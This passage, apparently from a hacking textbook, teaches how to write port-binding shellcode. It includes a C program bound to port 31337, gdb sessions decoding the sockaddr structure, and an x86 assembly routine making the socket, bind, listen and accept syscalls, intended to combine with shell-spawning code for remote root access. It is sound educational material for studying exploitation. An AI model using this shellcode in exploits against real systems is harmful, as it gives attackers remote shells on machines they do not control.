When exploiting a remote program, the shellcode we've designed so far won't work
The injected shellcode needs to communicate over the network to deliver an interactive root prompt
Port-binding shellcode will bind the shell to a network port where it listens for incoming connections
In the previous chapter, we used this kind of shellcode to exploit the tinyweb server
The following C code binds to port 31337 and listens for a TCP connection

bind_port.c
__________________________________________________________________________________
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
   int sockfd, new_sockfd;  // Listen on sock_fd, new connection on new_fd
   struct sockaddr_in host_addr, client_addr; // My address information
   socklen_t sin_size;
   int yes=1;

   sockfd = socket(PF_INET, SOCK_STREAM, 0);

   host_addr.sin_family = AF_INET;         // host byte order
   host_addr.sin_port = htons(31337);      // short, network byte order
   host_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP
   memset(&(host_addr.sin_zero), '\0', 8); // zero the rest of the struct

   bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));

   listen(sockfd, 4);

   sin_size = sizeof(struct sockaddr_in);
   new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
}
__________________________________________________________________________________

These familiar socket functions can all be accessed with a single Linux system call, aptly named socketcall()
This is syscall number 102, which has a slightly cryptic manual page

__________________________________________________________________________________
reader@hacking:~/booksrc $ grep socketcall /usr/include/asm-i386/unistd.h
#define __NR_socketcall         102

reader@hacking:~/booksrc $ man 2 socketcall
SOCKETCALL(2)                 Linux Programmer's Manual              SOCKETCALL(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is  a  common kernel entry point for the socket system 
       calls.  call determines which socket function to invoke.  args points to a 
       block containing the actual arguments, which are passed through to the appropriate call.

       User programs should call the appropriate functions by their usual names.  
       Only standard library implementors and kernel hackers  need  to  know  
       about  socketcall().
__________________________________________________________________________________

The possible call numbers for the first argument are listen in the linux/net.h include file


FROM /usr/include/linux/net.h
__________________________________________________________________________________
#define SYS_SOCKET      1       /* sys_socket(2)                */
#define SYS_BIND        2       /* sys_bind(2)                  */
#define SYS_CONNECT     3       /* sys_connect(2)               */
#define SYS_LISTEN      4       /* sys_listen(2)                */
#define SYS_ACCEPT      5       /* sys_accept(2)                */
#define SYS_GETSOCKNAME 6       /* sys_getsockname(2)           */
#define SYS_GETPEERNAME 7       /* sys_getpeername(2)           */
#define SYS_SOCKETPAIR  8       /* sys_socketpair(2)            */
#define SYS_SEND        9       /* sys_send(2)                  */
#define SYS_RECV        10      /* sys_recv(2)                  */
#define SYS_SENDTO      11      /* sys_sendto(2)                */
#define SYS_RECVFROM    12      /* sys_recvfrom(2)              */
#define SYS_SHUTDOWN    13      /* sys_shutdown(2)              */
#define SYS_SETSOCKOPT  14      /* sys_setsockopt(2)            */
#define SYS_GETSOCKOPT  15      /* sys_getsockopt(2)            */
#define SYS_SENDMSG     16      /* sys_sendmsg(2)               */
#define SYS_RECVMSG     17      /* sys_recvmsg(2)               */
__________________________________________________________________________________

So, to make socket system calls using Linux, EAX is always 102 for socketcall(), EBX contains the type of socket call, and ECX is a pointer to the socket call's arguments
The calls are simple enough, but some of them require a sockaddr structure, which must be built by the shellcode
Debugging the compiled C code is the most direct way to look at this structure in memory

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -g bind_port.c

reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

(gdb) list 18
13         sockfd = socket(PF_INET, SOCK_STREAM, 0); 
14    
15         host_addr.sin_family = AF_INET;         // Host byte order 
16         host_addr.sin_port = htons(31337);      // Short, network byte order 
17         host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP. 
18         memset(&(host_addr.sin_zero), '\0', 8); // Zero the rest of the struct. 
19    
20         bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)); 
21    
22         listen(sockfd, 4); 

(gdb) break 13
Breakpoint 1 at 0x804849b: file bind_port.c, line 13.

(gdb) break 20
Breakpoint 2 at 0x80484f5: file bind_port.c, line 20.

(gdb) run
Starting program: /home/reader/booksrc/a.out

Breakpoint 1, main () at bind_port.c:13
13         sockfd = socket(PF_INET, SOCK_STREAM, 0); 

(gdb) x/5i $eip
0x804849b <main+23>:     mov   DWORD PTR [esp+8],0x0
0x80484a3 <main+31>:     mov   DWORD PTR [esp+4],0x1
0x80484ab <main+39>:     mov   DWORD PTR [esp],0x2
0x80484b2 <main+46>:     call  0x8048394 <socket@plt>
0x80484b7 <main+51>:     mov   DWORD PTR [ebp-12],eax
__________________________________________________________________________________

The first breakpoint is just before the socket call happens, since we need to check the value of PF_INET and SOCK_STREAM
ALl 3 arguments are pushed to the stack (but with mov instructions) in reverse order
This means PF_INET is 2 and SOCK_STREAM is 1

__________________________________________________________________________________
(gdb) cont
Continuing.

Breakpoint 2, main () at bind_port.c:20
20         bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)); 

(gdb) print host_addr
$1 = {sin_family = 2, sin_port = 27002, sin_addr = {s_addr = 0},
  sin_zero = "\000\000\000\000\000\000\000"}

(gdb) print sizeof(struct sockaddr)
$2 = 16

(gdb) x/16xb &host_addr
0xbffff780:     0x02     0x00     0x7a     0x69     0x00     0x00     0x00     0x00
0xbffff788:     0x00     0x00     0x00     0x00     0x00     0x00     0x00     0x00

(gdb) p /x 27002
$3 = 0x697a

(gdb) p 0x7a69
$4 = 31337
__________________________________________________________________________________

The next breakpoint happens after the sockaddr structure is filled with values
The debugger is smart enough to decode the elements of the structure when host_addr is printed, but now we need to be smart enough to realize the port is stored in network byte order
The sin_family and sin_port elements are both words, followed by the address as a DWORD
In this case, the address is 0, which means any address can be used for binding
The remaining 8 bytes after that are just extra space in the structure
The first 8 bytes in the structure (0xbffff780) contain all the important information

The following assembly instructions perform all the socket calls needed to bind to port 31337 and accept TCP connections
The sockaddr structure and the argument arrays are each created by pushing values in reverse order to the stack and then copying ESP into ECX
The last 8 bytes of the sockaddr structure aren't actually pushed to the stack, since they aren't used
Whatever random 8 bytes happen to be on the stack will occupy this space, which is fine

bind_port.s
__________________________________________________________________________________
BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; Zero out edx for use as a null DWORD later 
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2}
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; After syscall, eax has socket file descriptor

  mov esi, eax      ; save socket FD in esi for later

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax           
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; Build sockaddr struct:  INADDR_ANY = 0
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = 0 on success

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = connected socket FD
__________________________________________________________________________________

When assembled and used in an exploit, this shellcode will bind to port 31337 and wait for an incoming connection, blocking at the accept call
When a connection is accepted, the new socket file descriptor is put into EAX at the end of this code
This won't really be useful until it's combined with the shell-spawning code described earlier
Fortunately, standard file descriptors make this fusion remarkably simple